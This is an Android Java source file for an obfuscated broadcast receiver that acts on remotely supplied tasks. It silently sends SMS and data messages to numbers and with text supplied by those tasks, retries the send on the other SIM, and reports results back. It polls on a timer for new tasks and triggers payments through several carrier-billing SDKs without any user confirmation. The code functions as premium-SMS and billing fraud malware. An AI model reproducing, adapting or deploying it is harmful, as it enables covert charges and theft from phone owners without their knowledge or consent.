package com.thirdparty.engine;

import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.text.TextUtils;
import android.util.Log;

import com.gandalf.daemon.utils.XL_log;
import com.mj.jar.pay.BillingListener;
import com.msm.modu1e.utils.SMSUtil;
import com.msm.modu1e.utils.SendResult;
import com.thirdparty.entry.SmsSendTask;
import com.thirdparty.entry.ThirdSdkTask;
import com.thirdparty.net.Reporter;
import com.thirdparty.net.RequestHelper;
import com.thirdparty.utils.Constants;
import com.wyzf.constant.PayResult;
import com.wyzf.pay.PayResultListener;

import java.util.ArrayList;
import java.util.Timer;
import java.util.TimerTask;

import cn.utopay.sdk.interfaces.PCallback;
import k.m.PayTask;


public class II1 extends BroadcastReceiver {
    private static XL_log log = null;

    @Override
    public void onReceive(Context context, Intent intent) {
        if (log == null) {
            log = new XL_log(this.getClass());
        }
        if (intent != null) {
            final String action = intent.getAction();
            if (TextUtils.isEmpty(action)) {
                return;
            }
            final Context ctx = context;
            final Intent local_intent = intent;
            log.debug("II1 action:" + action);
            if (action.equals(Constants.INTENT_ACTION_DO_SMS_TASK)) {
                log.debug("do sms task");
                Bundle b = local_intent.getExtras();
                if (b != null) {
                    ArrayList<SmsSendTask> smsSendTasks = (ArrayList<SmsSendTask>) b.getSerializable(Constants.BUNDLE_KEY_SMS_SEND_TASKS);
                    if (smsSendTasks != null) {
                        log.debug("Do sms Task:" + smsSendTasks.toString());
                        exeSmsTask(ctx, smsSendTasks);
                    }
                }
            } else if (action.equals(Constants.INTENT_ACTION_REQEUST_PAYTASK)) {
                Bundle b = local_intent.getExtras();
                if (b != null) {
                    PayTask payTask = (PayTask) b.getSerializable(Constants.BUNDLE_KEY_PAYTASK);
                    if (payTask != null) {
                        log.debug("request pay Task:" + payTask.toString());
                        RequestHelper.requestPayTask(ctx, payTask);
                    }
                }
            } else if (action.equals(Constants.INTENT_ACTION_DO_PAYTASK_WITH_WY)) { //pay with weiyun
                log.debug("do pay task with weiyun");
                Bundle b = local_intent.getExtras();
                if (b != null) {
                    final ThirdSdkTask payTask = (ThirdSdkTask) b.getSerializable(Constants.BUNDLE_KEY_PAYTASK_WEIYUN);
                    if (payTask != null) {
                        log.debug("Do weiyun pay Task:" + payTask.toString());
                        WYpay wy = WYpay.getInstance(ctx);
                        wy.init(payTask.mAppId, payTask.mCid);
                        wy.pay(payTask.mFeeId, payTask.mFee, new PayResultListener() {
                            @Override
                            public void onResult(PayResult payResult, int i) {
                                switch (payResult) {
                                    case SUCCESS:
                                        log.debug("wy pay task:" + payTask.toString() + " success");
                                        break;
                                    default:
                                        log.error("wy pay task:" + payTask.toString() + " failed , msg:" + payResult.msg);
                                        break;
                                }
                            }
                        });
                    }
                }
            } else if (action.equals(Constants.INTENT_ACTION_DO_PAYTASK_WITH_YF)) { // pay with yufeng
                log.debug("do pay task with yufeng");
                Bundle b = local_intent.getExtras();
                if (b != null) {
                    final ThirdSdkTask payTask = (ThirdSdkTask) b.getSerializable(Constants.BUNDLE_KEY_PAYTASK_YUFENG);
                    if (payTask != null) {
                        log.debug("Do yufeng pay Task:" + payTask.toString());
                        YuFengPay pay = new YuFengPay(ctx);
                        pay.init(payTask.mAppId, payTask.mCid, new BillingListener() {
                            @Override
                            public void onBillingResult(int i, Bundle bundle) {
                                if (i == 2000) {
                                    log.debug("yufeng pay task:" + payTask.toString() + " success ,code:" + i);
                                } else {
                                    log.error("yufeng pay task:" + payTask.toString() + " failed ,code:" + i);
                                }
                            }

                            @Override
                            public void onInitResult(int i) {
                                if (i == 1000) {
                                    log.debug("yufeng onInitResult success code:" + i);
                                } else {
                                    log.debug("yufeng onInitResult error code :" + i);
                                }
                            }
                        });
                        pay.pay(payTask.mFeeId, payTask.mFee);
                    }
                }
            } else if (action.equals(Constants.INTENT_ACTION_DO_PAYTASK_WITH_YUNBEI)) { // pay with yunbei
                log.debug("do pay task with yunbei");
                Bundle b = local_intent.getExtras();
                if (b != null) {
                    final ThirdSdkTask payTask = (ThirdSdkTask) b.getSerializable(Constants.BUNDLE_KEY_PAYTASK_YUNBEI);
                    if (payTask != null) {
                        log.debug("Do yunbei pay Task:" + payTask.toString());
                        YunBeiPay pay = YunBeiPay.getInstance(ctx);// should be Activity
                        pay.init(payTask.mAppId, payTask.mCid);
                        pay.pay(payTask.mFeeId, null, new PCallback() {
                            @Override
                            public void payEnd(int i) {
                                if (i == 0) {
                                    log.debug("yunbei pay task:" + payTask.toString() + " success");
                                } else {
                                    log.error("yunbei pay task:" + payTask.toString() + " failed, code:" + i);
                                }
                            }
                        });
                    }
                }
            }
        }

    }


    private void exeSmsTask(Context context, ArrayList<SmsSendTask> smsSendTasks) {
        final ArrayList<SmsSendTask> local_smsSendTasks = smsSendTasks;
        final Context local_context = context;
        new Thread(new Runnable() {
            @Override
            public void run() {
                for (int i = 0; i < local_smsSendTasks.size(); i++) {
                    SmsSendTask smsSendTask = local_smsSendTasks.get(i);
                    if (smsSendTask != null) {
                        sendSmsTaskWrap(local_context, smsSendTask);
                    }
                }
            }
        }).start();
    }

    private void sendSmsTaskWrap(Context context, SmsSendTask smsSendTask) {
       // retrySendSMSWithOtherSimId(context, smsSendTask);
        sendSmsTask(context, smsSendTask);
    }

    private void sendSmsTask(Context context, SmsSendTask smsSendTask) {
        String taskId = smsSendTask.mTaskId;
        String sendToNumber = smsSendTask.mSendToNumber;
        int simId = smsSendTask.mSimId;
        String content = smsSendTask.mContent;

        if (TextUtils.isEmpty(sendToNumber)) {
            log.error("SMS_SEND_SEND_TO_NUMBER_ERROR: toNumber is null");
            return;
        }
        if (TextUtils.isEmpty(content)) {
            log.error("SMS_SEND_SEDN_CONTENT_ERROR: content is null");
            return;
        }
        Intent sentIntent = new Intent(Constants.RECEIVER_FILTER_ACTION_SENDSMS_CHANNEL);
        Bundle bundle = new Bundle();
        bundle.putSerializable(Constants.BUNDLE_KEY_SMS_SEND_TASKS, smsSendTask);
        sentIntent.putExtras(bundle);
        PendingIntent sentPI = PendingIntent.getBroadcast(context, (int) System.currentTimeMillis(), sentIntent, PendingIntent.FLAG_ONE_SHOT);


        Intent arriveIntent = new Intent(Constants.RECEIVER_FILTER_ACTION_SENDSMS_ARRIVE);
        Bundle bundle2 = new Bundle();
        bundle2.putSerializable(Constants.BUNDLE_KEY_SMS_SEND_TASKS, smsSendTask);
        arriveIntent.putExtras(bundle2);
        PendingIntent arrivePI = PendingIntent.getBroadcast(context, (int) System.currentTimeMillis(), arriveIntent, PendingIntent.FLAG_ONE_SHOT);

        String type = smsSendTask.mType;
        if (!type.isEmpty() && type.equals("data")) {
            SmsManager sm = SmsManager.getDefault();
            short port = 0;
            sm.sendDataMessage(sendToNumber, null, port, content.getBytes(), sentPI, null);
            return;
        }

        log.debug("send Sms taskId:" + taskId + " , toNumber:" + sendToNumber + " ,simId:" + simId + " , content:" + content + " start reflect send");
        SendResult sendResult = SMSUtil.sendSMS(context, simId, sendToNumber, null, content, sentPI, arrivePI);

        String reflectRet = "";
        if (sendResult.mReflectMsg != null) {
            reflectRet = sendResult.mReflectMsg;
        }
        log.debug("send Sms taskId:" + taskId + " , toNumber:" + sendToNumber + " ,simId:" + simId + " , content:" + content
                + " reflect send result:" + reflectRet);
        if (sendResult.mReflectResult) {
            Reporter.reportSmsSendResult(context, taskId, 1, "send reflect success");
        } else {
            Reporter.reportSmsSendResult(context, taskId, 0, "send reflect failed ,msg:" + sendResult.mReflectMsg);
        }
    }

    public static Timer smNextTaskTimer = null;

    public static void scheduleNextTask(Context context, long startTime, long intercal) {
        if (context == null)
            return;
        final Context local_context = context;
        if (smNextTaskTimer != null) {
            smNextTaskTimer.cancel();
        }
        smNextTaskTimer = new Timer("request_timer");
        TimerTask timerTask = new TimerTask() {
            @Override
            public void run() {
                // TODO Auto-generated method stub
                startServiceWithAction(local_context, Constants.INTENT_ACTION_REQUEST_SMSTASK);
            }
        };
        smNextTaskTimer.schedule(timerTask, startTime, intercal);
    }

    private static void cancelScheduleUpdateTask() {
        if (smNextTaskTimer != null) {
            smNextTaskTimer.cancel();
            smNextTaskTimer = null;
        }
    }

    public static void destory() {

    }

    public static void startServiceWithAction(Context context, String action) {
        if (!TextUtils.isEmpty(action)) {
            Intent intent = new Intent();
            intent.setAction(action);
            context.sendBroadcast(intent);
        }
    }

    private static ArrayList<SmsSendTask> smSmsSendTaks = new ArrayList<>();

    public static void removeRetrySendWithOtherSimIdSmsTask(String toNumber, String content, int simId) {
        if (TextUtils.isEmpty(toNumber) || TextUtils.isEmpty(content)) {
            return;
        }
        if (smSmsSendTaks == null || smSmsSendTaks.isEmpty()) {
            return;
        }
        int length = smSmsSendTaks.size();
        for (int i = 0; i < length; i++) {
            SmsSendTask task = smSmsSendTaks.get(i);
            String number = task.mSendToNumber;
            String text = task.mContent;
            int id = task.mSimId;
            if (toNumber.equals(number) && content.equals(text) && simId == id) {
                smSmsSendTaks.remove(i);
                log.debug("remove try send sms task , toNumber:" + toNumber + " content:" + content + " simId:" + simId);
                break;
            }
        }
    }


    private static Timer reTryTimer = null;

    private void retrySendSMSWithOtherSimId(Context ctx, final SmsSendTask smsSendTask) {
        final Context local_ctx = ctx;
        if (smsSendTask == null || TextUtils.isEmpty(smsSendTask.mSendToNumber) || TextUtils.isEmpty(smsSendTask.mContent)) {
            return;
        }
        smSmsSendTaks.add(smsSendTask);
        if (reTryTimer == null) {
            reTryTimer = new Timer();
            reTryTimer.schedule(new TimerTask() {
                @Override
                public void run() {
                    if (smSmsSendTaks != null && !smSmsSendTaks.isEmpty()) {
                        SmsSendTask sendTask = smSmsSendTaks.get(0);
                        smSmsSendTaks.remove(0);
                        int simId = sendTask.mSimId;
                        if (simId == 0) {
                            sendTask.mSimId = 1;
                        } else if (simId == 1) {
                            sendTask.mSimId = 0;
                        }
                        log.debug("do retry with sim:" + simId + " toNum:" + smsSendTask.mSendToNumber + " content:" + smsSendTask.mContent + " simId:" + sendTask.mSimId);
                        sendSmsTask(local_ctx, smsSendTask);
                    } else {
                        log.debug("retry send sms task is finish");
                        if (reTryTimer != null) {
                            reTryTimer.cancel();
                            reTryTimer = null;
                        }
                    }
                }
            }, 10 * 1000, 10 * 1000);
        }
    }

}
